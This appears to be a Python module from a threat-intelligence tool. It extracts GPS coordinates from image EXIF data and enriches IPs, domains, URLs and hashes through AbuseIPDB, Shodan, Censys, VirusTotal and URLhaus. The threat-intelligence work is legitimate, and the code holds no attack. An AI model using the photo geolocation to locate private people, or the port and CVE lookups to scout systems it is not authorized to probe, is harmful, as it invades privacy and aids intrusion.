def _dms_to_decimal(dms: Any, ref: Any) -> float:
    degrees = _rational_to_float(dms[0])
    minutes = _rational_to_float(dms[1])
    seconds = _rational_to_float(dms[2])
    value = degrees + (minutes / 60.0) + (seconds / 3600.0)
    if str(ref).upper() in ("S", "W"):
        value *= -1
    return value


def _extract_image_gps(path: str) -> tuple[Any, ...]:
    from PIL import Image, ExifTags

    with Image.open(path) as img:
        image_info = {"format": img.format, "size": img.size}
        exif = img.getexif()
        gps_raw = {}
        try:
            gps_raw = exif.get_ifd(34853)
        except Exception:
            gps_raw = exif.get(34853) or {}
        gps = {ExifTags.GPSTAGS.get(key, key): value for key, value in dict(gps_raw).items()}
        lat = gps.get("GPSLatitude")
        lat_ref = gps.get("GPSLatitudeRef")
        lon = gps.get("GPSLongitude")
        lon_ref = gps.get("GPSLongitudeRef")
        if not (lat and lat_ref and lon and lon_ref):
            return None, image_info, exif
        return (_dms_to_decimal(lat, lat_ref), _dms_to_decimal(lon, lon_ref)), image_info, exif


def run_osint_image_geolocation() -> None:
    """
    Extract and map GPS coordinates from image EXIF metadata.

    Opens a JPEG or TIFF with Pillow, reads GPSLatitude, GPSLongitude,
    and associated reference tags, converts DMS to decimal degrees, and
    prints a Google Maps link for the location.  Also displays full EXIF
    data including camera make/model, timestamp, and focal length.
    Requires: Pillow.
    """
    print_rule("Image Geolocation Assistant")
    path = input("  Image path: ").strip().strip('"')
    if not os.path.isfile(path):
        print("  [!] File not found.")
        input("\nPress Enter to return...")
        return
    try:
        from PIL import ExifTags
        coords, image_info, exif = _extract_image_gps(path)
    except ImportError:
        print("  [!] Pillow is not installed. Run: pip install Pillow")
        input("\nPress Enter to return...")
        return
    except Exception as e:
        print(f"  [!] Could not read EXIF metadata: {e}")
        input("\nPress Enter to return...")
        return

    lines = [f"Image geolocation: {path}"]
    tag_map = {ExifTags.TAGS.get(key, key): value for key, value in exif.items()}
    for label in ("Make", "Model", "DateTime", "DateTimeOriginal", "Software"):
        if tag_map.get(label):
            _append_item(lines, f"{label}: {tag_map[label]}")
    _append_item(lines, f"Format: {image_info.get('format')}")
    width, height = image_info.get("size", ("?", "?"))
    _append_item(lines, f"Size: {width} x {height}")

    if coords:
        lat, lon = coords
        _append_section(lines, "GPS")
        _append_item(lines, f"Coordinates: {lat:.6f}, {lon:.6f}")
        _append_item(lines, f"Google Maps: https://www.google.com/maps?q={lat:.6f},{lon:.6f}")
        _append_item(lines, f"OpenStreetMap: https://www.openstreetmap.org/?mlat={lat:.6f}&mlon={lon:.6f}#map=16/{lat:.6f}/{lon:.6f}")
    else:
        _append_item(lines, "GPS: none found")

    _save_osint_run("image_geo", path, "image EXIF geolocation check", lines)
    input("\nPress Enter to return...")


def _classify_ioc(value: str) -> str:
    raw = value.strip()
    lowered = raw.lower()
    if re.fullmatch(r"[a-fA-F0-9]{32}", raw):
        return "hash-md5"
    if re.fullmatch(r"[a-fA-F0-9]{40}", raw):
        return "hash-sha1"
    if re.fullmatch(r"[a-fA-F0-9]{64}", raw):
        return "hash-sha256"
    try:
        ipaddress.ip_address(raw)
        return "ip"
    except ValueError:
        pass
    if lowered.startswith(("http://", "https://")):
        return "url"
    if "@" in raw and "." in raw.rsplit("@", 1)[-1]:
        return "email"
    if re.fullmatch(r"[A-Za-z0-9.-]+\.[A-Za-z]{2,}", raw):
        return "domain"
    return "unknown"


ABUSEIPDB_CATEGORIES = {
    1: "DNS Compromise", 2: "DNS Poisoning", 3: "Fraud Orders",
    4: "DDoS Attack", 5: "FTP Brute-Force", 6: "Ping of Death",
    7: "Phishing", 8: "Fraud VoIP", 9: "Open Proxy", 10: "Web Spam",
    11: "Email Spam", 12: "Blog Spam", 13: "VPN IP", 14: "Port Scan",
    15: "Hacking", 16: "SQL Injection", 17: "Spoofing", 18: "Brute-Force",
    19: "Bad Web Bot", 20: "Exploited Host", 21: "Web App Attack",
    22: "SSH Brute-Force", 23: "IoT Targeted",
}


def _load_argus_config() -> dict[str, Any]:
    """Load argus_config.json from the same directory as argus.py, return dict."""
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "argus_config.json")
    if not os.path.isfile(config_path):
        return {}
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _ioc_query_abuseipdb(ip: str, api_key: str) -> dict[str, Any]:
    """Query AbuseIPDB for an IP. Returns a result dict or raises."""
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    resp = requests.get(
        "https://api.abuseipdb.com/api/v2/check",
        headers={"Key": api_key, "Accept": "application/json"},
        params={"ipAddress": ip, "maxAgeInDays": "90", "verbose": ""},
        timeout=10,
    )
    if resp.status_code == 401:
        return {"error": "Invalid AbuseIPDB API key — check argus_config.json"}
    if resp.status_code == 429:
        return {"error": "AbuseIPDB rate limit hit (1,000/day on free tier)"}
    resp.raise_for_status()
    return resp.json().get("data", {})


def _ioc_query_urlhaus(value: str, kind: str, api_key: str = "") -> dict[str, Any]:
    """Query URLhaus for a URL or domain. Returns a result dict or raises."""
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    headers = {}
    if api_key:
        headers["Auth-Key"] = api_key
    if kind == "url":
        resp = requests.post(
            "https://urlhaus-api.abuse.ch/v1/url/",
            data={"url": value},
            headers=headers,
            timeout=10,
        )
    else:
        resp = requests.post(
            "https://urlhaus-api.abuse.ch/v1/host/",
            data={"host": value},
            headers=headers,
            timeout=10,
        )
    if resp.status_code == 401:
        return {"error": "urlhaus_auth"}
    resp.raise_for_status()
    return resp.json()


def _scrub_key(msg: str, key: str) -> str:
    """Remove the API key from an error message so it is never displayed."""
    if key and key in str(msg):
        return str(msg).replace(key, "***REDACTED***")
    return str(msg)


def _ioc_query_shodan_host(ip: str, api_key: str) -> dict[str, Any]:
    """Full Shodan host lookup — open ports, banners, CVEs, tags. No credits used."""
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    try:
        resp = requests.get(
            f"https://api.shodan.io/shodan/host/{ip}",
            params={"key": api_key},
            timeout=10,
        )
    except Exception as e:
        return {"error": _scrub_key(e, api_key)}

    if resp.status_code == 401:
        return {"error": "Invalid Shodan API key — check argus_config.json"}
    if resp.status_code == 403:
        return {"error": "Shodan API key does not have permission for this endpoint"}
    if resp.status_code == 404:
        return {"error": "not_found"}
    if resp.status_code == 429:
        return {"error": "Shodan rate limit reached — try again shortly"}
    if not resp.ok:
        return {"error": f"Shodan returned HTTP {resp.status_code}"}
    return resp.json()


def _ioc_query_shodan_domain(domain: str, api_key: str) -> dict[str, Any]:
    """
    Shodan DNS domain lookup — returns subdomains and DNS record data for a domain.
    Uses /dns/domain/{domain} which does NOT consume query credits.
    Returns a result dict or an {"error": "..."} dict on failure.
    """
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    try:
        resp = requests.get(
            f"https://api.shodan.io/dns/domain/{domain}",
            params={"key": api_key},
            timeout=12,
        )
    except Exception as e:
        return {"error": _scrub_key(str(e), api_key)}
    if resp.status_code == 401:
        return {"error": "Invalid Shodan API key — check argus_config.json"}
    if resp.status_code == 403:
        return {"error": "Shodan plan does not include this endpoint"}
    if resp.status_code == 404:
        return {"error": "not_found"}
    if resp.status_code == 429:
        return {"error": "Shodan rate limit reached — try again shortly"}
    if not resp.ok:
        return {"error": f"Shodan returned HTTP {resp.status_code}"}
    try:
        return resp.json()
    except Exception:
        return {"error": "Failed to parse Shodan response"}


def _ioc_query_censys(ip: str, pat: str) -> dict[str, Any]:
    """
    Censys Platform API host lookup — GET /v3/global/asset/host/{ip}.

    Uses Bearer token (Personal Access Token) auth, no Organization ID
    required for Free-tier accounts (requests fall back to Free credits
    automatically when no org ID is supplied).

    Requires the vendor-specific Accept header per Censys' versioned
    schema system — this is easy to get wrong, so it's hardcoded here
    exactly per their docs (api version v3, asset type host, schema v1).

    Returns the 'resource' dict from the response, or {"error": "..."}.
    """
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}

    headers = {
        "Authorization": f"Bearer {pat}",
        "Accept": "application/vnd.censys.api.v3.host.v1+json",
    }
    try:
        resp = requests.get(
            f"https://api.platform.censys.io/v3/global/asset/host/{ip}",
            headers=headers,
            timeout=15,
        )
    except Exception as e:
        return {"error": _scrub_key(str(e), pat)}

    if resp.status_code == 401:
        return {"error": "Invalid Censys PAT — check argus_config.json"}
    if resp.status_code == 403:
        return {"error": "Censys: insufficient permissions for this endpoint (need API Access role)"}
    if resp.status_code == 404:
        return {"error": "not_found"}
    if resp.status_code == 422:
        return {"error": "Censys: malformed request (check IP format)"}
    if not resp.ok:
        return {"error": f"Censys returned HTTP {resp.status_code}"}

    try:
        return resp.json().get("result", {}).get("resource", {})
    except Exception:
        return {"error": "Failed to parse Censys response"}


def _ioc_query_internetdb(ip: str) -> dict[str, Any]:
    """
    Shodan InternetDB — free, no key, returns ports/CVEs/CPEs/tags for an IP.
    Falls back gracefully if the IP has no data.
    """
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    resp = requests.get(
        f"https://internetdb.shodan.io/{ip}",
        timeout=8,
    )
    if resp.status_code == 404:
        return {"error": "not_found"}
    resp.raise_for_status()
    return resp.json()


def _ioc_query_malwarebazaar(hash_value: str) -> dict[str, Any]:
    """Query MalwareBazaar for a file hash. Returns a result dict or raises."""
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    resp = requests.post(
        "https://mb-api.abuse.ch/api/v1/",
        data={"query": "get_info", "hash": hash_value},
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def _ioc_query_virustotal(value: str, vt_kind: str, api_key: str) -> dict[str, Any]:
    """
    Query the VirusTotal v3 API for a hash, IP, domain, or URL.

    vt_kind matches _classify_ioc() output:
        'hash-md5' / 'hash-sha1' / 'hash-sha256' → /v3/files/{hash}
        'ip'                                      → /v3/ip_addresses/{ip}
        'domain'                                  → /v3/domains/{domain}
        'url'                                     → /v3/urls/{base64url_id}

    Returns the 'data' object from the VT response, or {"error": "..."} on failure.
    Always scrubs the API key from any error messages before returning.
    """
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}

    headers = {"x-apikey": api_key, "Accept": "application/json"}
    base    = "https://www.virustotal.com/api/v3"

    if vt_kind.startswith("hash"):
        endpoint = f"{base}/files/{value}"
    elif vt_kind == "ip":
        endpoint = f"{base}/ip_addresses/{value}"
    elif vt_kind == "domain":
        endpoint = f"{base}/domains/{value}"
    elif vt_kind == "url":
        # VT URL identifier = base64url-encoded URL without padding
        url_id   = base64.urlsafe_b64encode(value.encode()).decode().rstrip("=")
        endpoint = f"{base}/urls/{url_id}"
    else:
        return {"error": f"Unsupported IOC type for VirusTotal: {vt_kind}"}

    try:
        resp = requests.get(endpoint, headers=headers, timeout=15)
    except Exception as e:
        return {"error": _scrub_key(str(e), api_key)}

    if resp.status_code == 401:
        return {"error": "Invalid VirusTotal API key — check argus_config.json"}
    if resp.status_code == 429:
        return {"error": "VirusTotal rate limit hit (4/min on free tier) — try again shortly"}
    if resp.status_code == 404:
        return {"error": "not_found"}
    if not resp.ok:
        return {"error": _scrub_key(f"VirusTotal returned HTTP {resp.status_code}", api_key)}
    try:
        return resp.json().get("data", {})
    except Exception:
        return {"error": "Failed to parse VirusTotal response"}


def _render_vt_result(data: dict[str, Any], vt_kind: str, lines_out: list[str]) -> None:
    """
    Parse and print a VirusTotal v3 data object.  Appends summary lines to `lines`.
    Returns (malicious_count, total_engines) for downstream verdict logic.
    """
    attrs      = data.get("attributes", {})
    stats      = attrs.get("last_analysis_stats", {})
    malicious  = stats.get("malicious",  0)
    suspicious = stats.get("suspicious", 0)
    harmless   = stats.get("harmless",   0)
    undetected = stats.get("undetected", 0)
    total      = malicious + suspicious + harmless + undetected

    if total == 0:
        verdict = "[  ?  ] No analysis data available"
    elif malicious >= 5:
        verdict = f"[  HI  ] MALICIOUS   ({malicious}/{total} engines)"
    elif malicious > 0 or suspicious >= 3:
        verdict = f"[  MED ] SUSPICIOUS  ({malicious} malicious, {suspicious} suspicious / {total})"
    elif suspicious > 0:
        verdict = f"[  LOW ] Low risk    ({suspicious} suspicious / {total})"
    else:
        verdict = f"[  OK  ] Clean       (0/{total} engines flagged)"

    print(f"  {verdict}")
    print(f"  Malicious      : {malicious}")
    print(f"  Suspicious     : {suspicious}")
    print(f"  Undetected     : {undetected}")
    print(f"  Total engines  : {total}")

    # ── Type-specific fields ───────────────────────────────────────────
    if vt_kind.startswith("hash"):
        name       = attrs.get("meaningful_name") or attrs.get("name", "?")
        file_type  = attrs.get("type_description") or attrs.get("magic", "?")
        size       = attrs.get("size")
        first_sub  = attrs.get("first_submission_date", "")
        tags       = attrs.get("tags", [])
        print(f"  File name      : {name}")
        print(f"  File type      : {file_type}")
        if size is not None:
            print(f"  Size           : {size:,} bytes")
        if first_sub:
            import datetime as _dt
            try:
                ts = _dt.datetime.utcfromtimestamp(int(first_sub)).strftime("%Y-%m-%d")
            except Exception:
                ts = str(first_sub)
            print(f"  First seen     : {ts}")
        if tags:
            print(f"  Tags           : {', '.join(tags[:8])}")
        # Show top detections
        detections = [
            (engine, r.get("result", "?"))
            for engine, r in attrs.get("last_analysis_results", {}).items()
            if r.get("category") == "malicious"
        ][:5]
        if detections:
            print(f"\n  Top detections ({len(detections)} shown):")
            for engine, result in detections:
                print(f"    {engine:<26} {result}")

    elif vt_kind == "ip":
        country = attrs.get("country", "?")
        asn     = attrs.get("asn", "?")
        org     = attrs.get("as_owner", "?")
        rep     = attrs.get("reputation", "?")
        print(f"  Country        : {country}")
        print(f"  ASN / Org      : {asn} / {org}")
        print(f"  VT Reputation  : {rep}")

    elif vt_kind == "domain":
        registrar = attrs.get("registrar", "?")
        created   = attrs.get("creation_date", "?")
        rep       = attrs.get("reputation", "?")
        cats      = attrs.get("categories", {})
        cat_str   = ", ".join(set(cats.values()))[:80] if cats else "none"
        print(f"  Registrar      : {registrar}")
        print(f"  Created        : {created}")
        print(f"  VT Reputation  : {rep}")
        if cat_str:
            print(f"  Categories     : {cat_str}")

    elif vt_kind == "url":
        http_code = attrs.get("last_http_response_code", "?")
        final_url = (attrs.get("last_final_url") or "?")[:75]
        rep       = attrs.get("reputation", "?")
        print(f"  HTTP status    : {http_code}")
        print(f"  Final URL      : {final_url}")
        print(f"  VT Reputation  : {rep}")

    lines += [
        "VirusTotal Results:",
        f"  Verdict    : {verdict}",
        f"  Malicious  : {malicious}/{total}",
        f"  Suspicious : {suspicious}/{total}",
    ]
    return malicious, total


def run_osint_ioc_assistant() -> None:
    """
    Multi-source IOC enrichment for IPs, domains, URLs, and file hashes.

    Auto-classifies the indicator type then queries configured APIs:
    AbuseIPDB and Shodan/InternetDB for IPs; URLhaus and VirusTotal for
    URLs and domains; MalwareBazaar and VirusTotal for hashes.  Censys
    Platform API (Bearer PAT) enriches IP results with port and service
    data.  Requires API keys in argus_config.json for full coverage.
    """
    import urllib.parse

    print_rule("IOC Lookup Assistant")

    config = _load_argus_config()
    abuseipdb_key   = config.get("abuseipdb_key",  "")
    urlhaus_key     = config.get("urlhaus_key",    "")
    shodan_key      = config.get("shodan_key",     "")
    virustotal_key  = config.get("virustotal_key", "")
    censys_pat      = config.get("censys_pat",     "")

    if abuseipdb_key:
        print("  [+] AbuseIPDB key loaded from argus_config.json")
    else:
        print("  [*] No AbuseIPDB key found — IP lookups will show links only.")
        print("      Add it to argus_config.json to enable live IP reputation checks.")

    if urlhaus_key:
        print("  [+] URLhaus key loaded from argus_config.json")
    else:
        print("  [*] No URLhaus key found — URL/domain lookups may require one.")
        print("      Register free at urlhaus.abuse.ch then add urlhaus_key to argus_config.json")

    if shodan_key:
        print("  [+] Shodan key loaded from argus_config.json")
    else:
        print("  [i] No Shodan key found — using InternetDB (free, no key) for IP data.")

    if virustotal_key:
        print("  [+] VirusTotal key loaded from argus_config.json")
    else:
        print("  [i] No VirusTotal key found — VT results will show reference links only.")
        print("      Register free at virustotal.com then add virustotal_key to argus_config.json")

    if censys_pat:
        print("  [+] Censys PAT loaded from argus_config.json")
    else:
        print("  [i] No Censys PAT found — skipping Censys host enrichment for IPs.")
    print()

    ioc = input("  Domain, IP, URL, email, or hash: ").strip()
    if not ioc:
        print("  [!] IOC cannot be empty.")
        input("\nPress Enter to return...")
        return

    kind = _classify_ioc(ioc)
    quoted = urllib.parse.quote(ioc, safe="")
    lines = [f"IOC Assistant: {ioc}", f"Type detected: {kind}", ""]

    print(f"\n  Detected type : {kind}")
    print("  " + "=" * 56)

    # ── Live API lookups ──────────────────────────────────────────────

    if kind == "ip":
        if abuseipdb_key:
            print("\n  [*] Querying AbuseIPDB ...")
            try:
                data = _ioc_query_abuseipdb(ioc, abuseipdb_key)
                if "error" in data:
                    print(f"  [!] {data['error']}")
                    lines.append(f"AbuseIPDB error: {data['error']}")
                else:
                    score       = data.get("abuseConfidenceScore", "?")
                    total       = data.get("totalReports", "?")
                    country     = data.get("countryCode", "?")
                    usage       = data.get("usageType", "?")
                    isp         = data.get("isp", "?")
                    last_report = data.get("lastReportedAt") or "never"
                    is_tor      = data.get("isTor", False)
                    is_public   = data.get("isPublic", True)

                    if score == 0:
                        verdict = "[  OK  ] Clean (confidence score 0)"
                    elif score < 25:
                        verdict = f"[  LOW ] Low risk (score {score}/100)"
                    elif score < 75:
                        verdict = f"[  MED ] Suspicious (score {score}/100)"
                    else:
                        verdict = f"[  HI  ] High risk (score {score}/100)"

                    print(f"  {verdict}")
                    print(f"  Reports (90d)  : {total}")
                    print(f"  Country        : {country}")
                    print(f"  ISP            : {isp}")
                    print(f"  Usage type     : {usage}")
                    print(f"  Last reported  : {last_report}")
                    if is_tor:
                        print("  [  !  ] Tor exit node")
                    if not is_public:
                        print("  [  i  ] Private / reserved address")

                    # Recent reports from verbose response
                    reports = data.get("reports", [])
                    if reports:
                        print(f"\n  Recent reports (latest {min(5, len(reports))}):")
                        for rep in reports[:5]:
                            cats = [ABUSEIPDB_CATEGORIES.get(c, str(c))
                                    for c in (rep.get("categories") or [])]
                            cat_str  = ", ".join(cats) if cats else "unclassified"
                            comment  = (rep.get("comment") or "").strip()[:80]
                            rep_date = (rep.get("reportedAt") or "")[:10]
                            rep_cc   = rep.get("reporterCountryCode", "??")
                            print(f"    [{rep_date}] [{rep_cc}] {cat_str}")
                            if comment:
                                print(f"               {comment}")

                    lines += [
                        "AbuseIPDB Results:",
                        f"  Verdict       : {verdict}",
                        f"  Reports (90d) : {total}",
                        f"  Country       : {country}",
                        f"  ISP           : {isp}",
                        f"  Usage type    : {usage}",
                        f"  Last reported : {last_report}",
                        f"  Tor exit node : {is_tor}",
                    ]
                    if reports:
                        lines.append(f"  Recent reports ({min(5, len(reports))} shown):")
                        for rep in reports[:5]:
                            cats = [ABUSEIPDB_CATEGORIES.get(c, str(c))
                                    for c in (rep.get("categories") or [])]
                            lines.append(
                                f"    [{(rep.get('reportedAt') or '')[:10]}]"
                                f" {', '.join(cats) or 'unclassified'}"
                                f" — {(rep.get('comment') or '').strip()[:60]}"
                            )
            except Exception as e:
                print(f"  [!] AbuseIPDB query failed: {e}")
                lines.append(f"AbuseIPDB error: {e}")
        else:
            print(f"  [i] AbuseIPDB: https://www.abuseipdb.com/check/{quoted}")
            lines.append(f"AbuseIPDB: https://www.abuseipdb.com/check/{quoted}")

        # ── Shodan / InternetDB ───────────────────────────────────────
        print()
        if shodan_key:
            print("  [*] Querying Shodan host intelligence ...")
            try:
                sd = _ioc_query_shodan_host(ioc, shodan_key)
                if "error" in sd:
                    if sd["error"] == "not_found":
                        print("  [  i  ] No Shodan data for this IP.")
                    else:
                        print(f"  [!] {sd['error']}")
                else:
                    ports      = sd.get("ports", [])
                    hostnames  = sd.get("hostnames", [])
                    country    = sd.get("country_name", "?")
                    city       = sd.get("city", "?")
                    org        = sd.get("org", "?")
                    isp        = sd.get("isp", "?")
                    asn        = sd.get("asn", "?")
                    os_det     = sd.get("os") or "unknown"
                    last_seen  = (sd.get("last_update") or "")[:10]
                    tags       = sd.get("tags") or []
                    vulns      = sd.get("vulns") or {}
                    banners    = sd.get("data") or []

                    print(f"  Last seen      : {last_seen}")
                    print(f"  Country/City   : {country} / {city}")
                    print(f"  ISP            : {isp}")
                    print(f"  Org / ASN      : {org} / {asn}")
                    print(f"  OS             : {os_det}")
                    if hostnames:
                        print(f"  Hostnames      : {', '.join(hostnames[:5])}")
                    if tags:
                        print(f"  Tags           : {', '.join(tags)}")

                    if ports:
                        print(f"\n  Open ports ({len(ports)}):")
                        for svc in sorted(banners, key=lambda x: x.get("port", 0))[:10]:
                            port      = svc.get("port", "?")
                            transport = svc.get("transport", "tcp")
                            product   = svc.get("product", "")
                            version   = svc.get("version", "")
                            module    = svc.get("_shodan", {}).get("module", "")
                            ssl_info  = svc.get("ssl", {})
                            tls_ver   = ""
                            if ssl_info:
                                tls_ver = f"  TLS: {ssl_info.get('versions', ['?'])[-1]}"
                            svc_str   = f"{product} {version}".strip() or module or "unknown"
                            print(f"    {port}/{transport:<4} {svc_str[:35]:<35}{tls_ver}")
                        if len(ports) > 10:
                            print(f"    ... {len(ports) - 10} more port(s)")

                    if vulns:
                        print(f"\n  CVEs detected by Shodan ({len(vulns)}):")
                        for cve_id, cve_data in list(vulns.items())[:10]:
                            cvss = cve_data.get("cvss", "?")
                            summary = (cve_data.get("summary") or "")[:60]
                            print(f"    {cve_id:<20} CVSS {cvss}  {summary}")
                        if len(vulns) > 10:
                            print(f"    ... {len(vulns) - 10} more CVE(s)")

                    lines += [
                        "Shodan Intelligence:",
                        f"  Last seen  : {last_seen}",
                        f"  Country    : {country} / {city}",
                        f"  ISP/Org    : {isp} / {org}",
                        f"  ASN        : {asn}",
                        f"  Open ports : {', '.join(str(p) for p in sorted(ports)[:20])}",
                        f"  Hostnames  : {', '.join(hostnames[:10])}",
                        f"  Tags       : {', '.join(tags)}",
                        f"  CVEs       : {', '.join(list(vulns.keys())[:10])}",
                    ]
            except Exception as e:
                print(f"  [!] Shodan query failed: {_scrub_key(e, shodan_key)}")
                lines.append(f"Shodan error: {_scrub_key(e, shodan_key)}")
        else:
            print("  [*] Querying Shodan InternetDB (no key required) ...")
            try:
                idb = _ioc_query_internetdb(ioc)
                if "error" in idb:
                    if idb["error"] == "not_found":
                        print("  [  i  ] No InternetDB data for this IP.")
                    else:
                        print(f"  [!] {idb['error']}")
                else:
                    idb_ports = idb.get("ports", [])
                    idb_hosts = idb.get("hostnames", [])
                    idb_cpes  = idb.get("cpes", [])
                    idb_cves  = idb.get("vulns", [])
                    idb_tags  = idb.get("tags", [])

                    print(f"  Open ports     : {', '.join(str(p) for p in sorted(idb_ports)) or 'none'}")
                    if idb_hosts:
                        print(f"  Hostnames      : {', '.join(idb_hosts[:5])}")
                    if idb_tags:
                        print(f"  Tags           : {', '.join(idb_tags)}")
                    if idb_cpes:
                        print(f"  CPEs ({len(idb_cpes)}):")
                        for cpe in idb_cpes[:5]:
                            print(f"    {cpe}")
                    if idb_cves:
                        print(f"  CVEs ({len(idb_cves)}):")
                        for cve in idb_cves[:10]:
                            print(f"    {cve}")
                        if len(idb_cves) > 10:
                            print(f"    ... {len(idb_cves) - 10} more")

                    lines += [
                        "Shodan InternetDB:",
                        f"  Ports     : {', '.join(str(p) for p in sorted(idb_ports))}",
                        f"  Hostnames : {', '.join(idb_hosts[:10])}",
                        f"  CPEs      : {', '.join(idb_cpes[:10])}",
                        f"  CVEs      : {', '.join(idb_cves[:10])}",
                        f"  Tags      : {', '.join(idb_tags)}",
                    ]
            except Exception as e:
                print(f"  [!] InternetDB query failed: {e}")
                lines.append(f"InternetDB error: {e}")

        # ── VirusTotal IP ─────────────────────────────────────────────
        if virustotal_key:
            print("\n  [*] Querying VirusTotal ...")
            try:
                vt_data = _ioc_query_virustotal(ioc, "ip", virustotal_key)
                if "error" in vt_data:
                    if vt_data["error"] == "not_found":
                        print("  [  i  ] IP not found in VirusTotal.")
                        lines.append("VirusTotal: not found")
                    else:
                        err = _scrub_key(vt_data["error"], virustotal_key)
                        print(f"  [!] {err}")
                        lines.append(f"VirusTotal error: {err}")
                else:
                    _render_vt_result(vt_data, "ip", lines)
            except Exception as e:
                print(f"  [!] VirusTotal query failed: {_scrub_key(e, virustotal_key)}")
                lines.append(f"VirusTotal error: {_scrub_key(e, virustotal_key)}")

        # ── Censys host lookup ───────────────────────────────────────
        if censys_pat:
            print("\n  [*] Querying Censys ...")
            try:
                cs = _ioc_query_censys(ioc, censys_pat)
                if "error" in cs:
                    if cs["error"] == "not_found":
                        print("  [  i  ] No Censys data for this IP.")
                        lines.append("Censys: not found")
                    else:
                        err = _scrub_key(cs["error"], censys_pat)
                        print(f"  [!] {err}")
                        lines.append(f"Censys error: {err}")
                else:
                    location = cs.get("location", {})
                    asn      = cs.get("autonomous_system", {})
                    services = cs.get("services", []) or []
                    svc_count = cs.get("service_count", len(services))
                    dns_info = cs.get("dns", {})
                    dns_names = (dns_info.get("names") or [])[:5]

                    city    = location.get("city", "?")
                    country = location.get("country", "?")
                    asn_n   = asn.get("asn", "?")
                    asn_org = asn.get("description", "?")

                    print(f"  Location       : {city}, {country}")
                    print(f"  ASN / Org      : {asn_n} / {asn_org}")
                    print(f"  Service count  : {svc_count}")
                    if dns_names:
                        print(f"  DNS names      : {', '.join(dns_names)}")

                    if services:
                        print("  Services (Censys scan data):")
                        for svc in services[:8]:
                            port  = svc.get("port", "?")
                            proto = svc.get("protocol", "?")
                            scan_t = (svc.get("scan_time") or "")[:10]
                            print(f"    {port}/{proto:<8} last scanned {scan_t}")
                        if len(services) > 8:
                            print(f"    ... {len(services) - 8} more service(s)")

                    lines += [
                        "Censys Host Data:",
                        f"  Location   : {city}, {country}",
                        f"  ASN/Org    : {asn_n} / {asn_org}",
                        f"  Services   : {svc_count}",
                        f"  DNS names  : {', '.join(dns_names)}",
                    ]
            except Exception as e:
                print(f"  [!] Censys query failed: {_scrub_key(e, censys_pat)}")
                lines.append(f"Censys error: {_scrub_key(e, censys_pat)}")

    elif kind in ("url", "domain"):
        urlhaus_key = config.get("urlhaus_key", "")
        print(f"\n  [*] Querying URLhaus ({'URL' if kind == 'url' else 'host'}) ...")
        try:
            data = _ioc_query_urlhaus(ioc, kind, urlhaus_key)
            if "error" in data:
                if data["error"] == "urlhaus_auth":
                    print("  [!] URLhaus requires an API key.")
                    print("      Register free at urlhaus.abuse.ch then add")
                    print("      \"urlhaus_key\": \"YOUR_KEY\" to argus_config.json")
                    lines.append("URLhaus: authentication required — add urlhaus_key to argus_config.json")
                else:
                    print(f"  [!] {data['error']}")
                    lines.append(f"URLhaus error: {data['error']}")
            else:
                query_status = data.get("query_status", "")
                if query_status == "no_results":
                    print("  [  OK  ] Not found in URLhaus — no known malicious activity")
                    lines.append("URLhaus: not found (clean)")
                else:
                    print(f"  [ !! ] Found in URLhaus")

                    if kind == "url":
                        # ── URL lookup ─────────────────────────────────────
                        url_status = data.get("url_status", "unknown")
                        threat     = data.get("threat", "")
                        tags       = data.get("tags") or []
                        date_added = data.get("date_added", "")[:10]
                        reporter   = data.get("reporter", "?")
                        payloads   = data.get("payloads") or []

                        print(f"  Status         : {url_status}")
                        if threat:
                            print(f"  Threat         : {threat}")
                        if tags:
                            print(f"  Tags           : {', '.join(tags)}")
                        print(f"  Date added     : {date_added}")
                        print(f"  Reported by    : {reporter}")

                        if payloads:
                            print(f"\n  Associated payloads ({len(payloads)}):")
                            for pl in payloads[:5]:
                                sig      = pl.get("signature") or "unknown"
                                ftype    = pl.get("file_type", "?")
                                sha256   = pl.get("response_sha256", "")
                                vt       = pl.get("virustotal")
                                vt_str   = ""
                                if vt and vt.get("result"):
                                    vt_str = f"  VT: {vt['result']}"
                                print(f"    {sig} [{ftype}] {sha256[:16]}...{vt_str}")
                            if len(payloads) > 5:
                                print(f"    ... {len(payloads) - 5} more payload(s)")

                        lines += [
                            "URLhaus Results (URL):",
                            f"  Status     : {url_status}",
                            f"  Threat     : {threat}",
                            f"  Tags       : {', '.join(tags)}",
                            f"  Date added : {date_added}",
                            f"  Reporter   : {reporter}",
                            f"  Payloads   : {len(payloads)}",
                        ]
                        for pl in payloads[:5]:
                            lines.append(
                                f"    {pl.get('signature','?')} "
                                f"[{pl.get('file_type','?')}] "
                                f"{pl.get('response_sha256','')}"
                            )

                    else:
                        # ── Host lookup ────────────────────────────────────
                        urls_seen = data.get("urls") or []
                        blacklists = data.get("blacklists") or {}
                        all_tags = set()
                        all_threats = set()
                        for u in urls_seen:
                            for t in (u.get("tags") or []):
                                all_tags.add(t)
                            if u.get("threat"):
                                all_threats.add(u["threat"])

                        print(f"  URLs on host   : {len(urls_seen)}")
                        if all_threats:
                            print(f"  Threats        : {', '.join(sorted(all_threats))}")
                        if all_tags:
                            print(f"  Tags           : {', '.join(sorted(all_tags))}")
                        if blacklists:
                            for bl_name, bl_status in blacklists.items():
                                print(f"  {bl_name:<20}: {bl_status}")

                        if urls_seen:
                            print(f"\n  Recent malicious URLs (latest {min(5, len(urls_seen))}):")
                            for u in urls_seen[:5]:
                                u_status = u.get("url_status", "?")
                                u_date   = (u.get("date_added") or "")[:10]
                                u_url    = u.get("url", "")[:70]
                                u_threat = u.get("threat", "")
                                print(f"    [{u_status}] [{u_date}] {u_threat}")
                                print(f"    {u_url}")

                        lines += [
                            "URLhaus Results (host):",
                            f"  URLs on host : {len(urls_seen)}",
                            f"  Threats      : {', '.join(sorted(all_threats))}",
                            f"  Tags         : {', '.join(sorted(all_tags))}",
                        ]
                        for u in urls_seen[:5]:
                            lines.append(
                                f"  [{u.get('url_status','?')}] "
                                f"{(u.get('date_added',''))[:10]} "
                                f"{u.get('url','')}"
                            )
        except Exception as e:
            print(f"  [!] URLhaus query failed: {e}")
            lines.append(f"URLhaus error: {e}")

